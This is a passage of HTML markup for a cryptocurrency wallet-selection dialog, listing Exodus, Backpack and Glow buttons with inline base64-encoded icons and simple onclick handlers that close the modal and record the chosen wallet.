0iMTA1LjA4NCIgeTE9IjEzMi41OTQiIHgyPSI2OS44NDM5IiB5Mj0iLTEyLjI3NjUiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iIzBCNDZGOSIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNCQkZCRTAiLz4KPC9saW5lYXJHcmFkaWVudD4KPHJhZGlhbEdyYWRpZW50IGlkPSJwYWludDFfcmFkaWFsXzMwXzExMCIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSg4LjQzMTc1IDI3LjQ2MDIpIHJvdGF0ZSg3Mi4yNTU3KSBzY2FsZSg5Ni40OTc5IDkwLjQ1NDMpIj4KPHN0b3Agb2Zmc2V0PSIwLjExOTc5MiIgc3RvcC1jb2xvcj0iIzg5NTJGRiIgc3RvcC1vcGFjaXR5PSIwLjg3Ii8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI0RBQkRGRiIgc3RvcC1vcGFjaXR5PSIwIi8+CjwvcmFkaWFsR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg==" alt="Exodus icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Exodus</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'backpack\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Backpack">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/png;base64,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" alt="Backpack icon" class="tw-mr-3">\n                            <div class="tw-flex tw-flex-col tw-justify-between">\n                              <span class="tw-text-sm tw-text-left">Backpack</span>\n                            </div>\n                          </div>\n                        </button>\n                      </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'glow\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Glow">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/png;base64,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